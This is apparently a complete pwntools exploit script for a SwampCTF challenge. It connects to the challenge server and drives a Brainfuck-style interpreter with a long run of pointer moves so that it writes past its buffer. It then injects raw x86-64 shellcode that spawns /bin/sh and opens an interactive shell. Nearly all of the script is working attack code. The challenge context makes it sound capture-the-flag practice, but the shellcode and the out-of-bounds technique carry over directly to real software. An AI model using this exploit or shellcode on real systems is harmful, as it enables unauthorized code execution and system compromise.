#!/usr/bin/env python3

from pwn import *

io = connect("chals.swampctf.com", 41414, level="debug")
#io = process("wrapper")

io.recvuntil(b":\n")
io.send(b"<" * 10150)

for i in range(27):
    io.send(b",>")

io.send(b"[q")

io.sendline(
    b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
)

io.interactive()
